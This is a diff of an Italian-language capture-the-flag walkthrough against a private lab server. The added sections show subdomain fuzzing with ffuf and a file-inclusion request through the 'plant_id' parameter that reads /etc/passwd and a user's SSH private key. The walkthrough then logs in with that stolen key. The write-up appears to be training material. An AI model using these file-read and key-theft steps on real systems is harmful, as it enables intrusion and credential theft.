@@ -46,7 +46,6 @@ Scopro che esiste la cartella `internal`. Ripetendo con `-u https://192.168.14.2
 Se faccio una richiesta `https` con `URL`: `https://192.168.14.27/internal/resources/backup/` posso navigare l'indice di questa cartella e scaricare dei file.
 
 **Risposta**: `https://192.168.14.27/internal/resources/backup/`
-
 # B2R03 
 Il file `temp5712837.bak` e' quello che mi interessa:
 ```bash
@@ -69,31 +68,45 @@ Accedo con `ftp`, e mi collego con le credenziali trovate in `B2R03`. Dentro `do
 
 **Risposta**: `RSA Private Key`
 ## B2R05
-Da `B2R01` sappiamo che un `vhost` valido e' `muntrea-energy.vdsi`, se provo a connettermi ad `https://muntrea-energy.vdsi/v1/adm1n/d4shb0ard/` specificando in `/etc/hosts` la mappatura `192.168.14.27 muntrea-energy.vdsi`.
+Da `B2R01` sappiamo che un `hostname` valido per il sito e' `muntrea-energy.vdsi`, se provo a connettermi ad `https://muntrea-energy.vdsi/v1/adm1n/d4shb0ard/` specificando in `/etc/hosts` la mappatura `192.168.14.27 muntrea-energy.vdsi` tutta via non riesco a connettermi.
 
-Otteniamo dunque la dashboard
-
-
+Devo ottenere il sottodominio:
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://muntrea-energy.vdsi/ -H "HOST: FUZZ.muntrea-energy.vdsi" -fs 1950
 ```
+**Soluzione**: Ottienamo che il `vhost` e' `control.muntrea-energy.vdsi`
 
-ottienamo che il `vhost` e' `control`
-
-
+## B2R06
+Considerando l'url:
 ```url
 https://control.muntrea-energy.vdsi/v1/adm1n/d4shb0ard/?page=plant&plant_id=sections/reactor-1
 ```
-* `plant_id` e' il parametro
+**Soluzione**: allora, `plant_id` e' il parametro.
 
+## B2R07
+Per ottenere la lista degli utenti posso sfruttare la pagina:
 ```bash
 https://control.muntrea-energy.vdsi/v1/adm1n/d4shb0ard/?page=plant&plant_id=/etc/passwd
 ```
 
+**Soluzione**: tra tutti l'utente piu' probabile per tale ruolo e' `muntrea-operator`
 
+## B2R08
+Avendo accesso al file system, posso prendere la chiave RSA dell'utente `muntrea-operator` e accedere, sperando lui abbia la flag.
+
+La chiave RSA si trova in:
 ```
 ### /home/muntrea-operator/.ssh/id_rsa
 ```
+
+cambio i permessi e mi connetto con rsa:
+```
+chmod 600 id_rsa
+ssh -i id_rsa 192.168.14.27
+```
+
+e navigando trovo la flag!
+
 
 # STDNA
 ## STDNA01
